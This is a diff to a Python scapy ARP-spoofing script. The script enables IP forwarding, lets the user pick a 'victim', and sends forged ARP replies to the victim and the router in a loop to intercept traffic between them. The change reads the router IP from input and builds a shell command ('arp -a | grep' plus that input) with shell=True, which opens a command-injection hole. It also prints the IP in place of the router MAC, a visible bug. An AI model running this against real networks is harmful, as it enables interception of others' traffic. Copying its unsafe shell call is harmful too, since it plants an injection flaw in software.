@@ -1,5 +1,6 @@
 from scapy.all import ARP, Ether, srp
 import os
+import subprocess
 
 os.system('echo 1 > /proc/sys/net/ipv4/ip_forward') 
 
@@ -18,12 +19,15 @@ for i in range (len(ip)):
 
 print("Chose a victim:")
 victim = int(input())-1
-print("Chose the router:")
-router = int(input())-1
+print("Input router ip: ")
+routerip = input()
+getVersion =  subprocess.Popen(("arp -a | grep " + (routerip)), shell=True, stdout=subprocess.PIPE).stdout
+version =  getVersion.read()
+routermac = (version.decode()).split()[3]
 
 print ("Victim ip: ", ip[victim],"    Victim mac: ", mac[victim])
 
-print ("Router ip: ", ip[router],"    Router mac: ", mac[router])
+print ("Router ip: ", routerip,"    Router mac: ", routerip)
 
 #hwsrc:mac source
 #hwdst: mac dest
@@ -32,8 +36,8 @@ print ("Router ip: ", ip[router],"    Router mac: ", mac[router])
 
 try:
     while True:
-        torouter = srp((Ether(dst=mac[router])/ARP(op = 2,pdst=ip[router], psrc=ip[victim])), timeout=3, verbose=0)
-        tovictim = srp((Ether(dst=mac[victim])/ARP(op = 2,pdst=ip[victim], psrc=ip[router])), timeout=3, verbose=0)
+        torouter = srp((Ether(dst=routermac)/ARP(op = 2,pdst=routerip, psrc=ip[victim])), timeout=3, verbose=0)
+        tovictim = srp((Ether(dst=mac[victim])/ARP(op = 2,pdst=ip[victim], psrc=routerip)), timeout=3, verbose=0)
 except KeyboardInterrupt:
     pass
 
